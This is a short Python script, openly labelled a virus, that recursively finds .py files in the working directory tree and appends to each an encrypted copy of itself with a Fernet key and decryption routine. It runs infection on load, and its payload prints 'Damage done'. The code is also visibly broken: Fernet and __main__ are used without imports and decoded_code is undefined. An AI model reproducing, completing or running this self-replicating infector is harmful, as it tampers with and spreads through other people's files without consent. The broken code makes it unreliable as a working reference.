import os
from random import random

def selectTarget(path):
    targets_list = []
    targets = os.listdir(path)
    for target in targets:
        if os.path.isdir(path+"/"+target):
            targets_list.extend(selectTarget(path+"/"+target))
        elif target[-3:] == ".py":
            infected = False
            for line in open(path+"/"+target):
                if line.strip() == '##### Start Decryption routine #####':
                    infected = True
                    break
            if not infected:
                targets_list.append(path+"/"+target)
    return targets_list

def copyCode(targets_list):
    
   for target in targets_list:
       
       os.rename(target, target + '_copy')
       destination = open(target, 'w')
       source = open(target + '_copy', 'r')
       this = open(__main__.__file__, 'r')
       
       destination.write(source.read())
       key = Fernet.generate_key()
       
       destination.write("\n##### Start Decryption routine #####\n")
       skip = 0
       copy = False
       for line in this:
          if line.strip() == '##### Start Decryption routine #####':
             destination.write(str(key)+'\n')
             copy = True
             skip = 1
          elif line.strip() == '##### End Decryption routine #####':
             destination.write(line)
             copy = False
          elif copy:
              if skip:
                  skip = 0
                  continue
              destination.write(line);
             
       destination.write("\n##### VIRUS BEGINS #####\n")
       
       cipher = Fernet(key)
       destination.write(str(cipher.encrypt(decoded_code)))
       
       destination.write("\n##### VIRUS ENDS #####")
       
       source.close()
       os.remove(target + '_copy')
       destination.close()
       this.close()

def payload():
    print("Payload executed")
    print("Damage done")

def infect():
    path = os.path.abspath("")
    targets_list = selectTarget(path)
    if not targets_list:
        print("No target")
        if random() < 0.25:
            payload();
    else:
        copyCode(targets_list)

infect()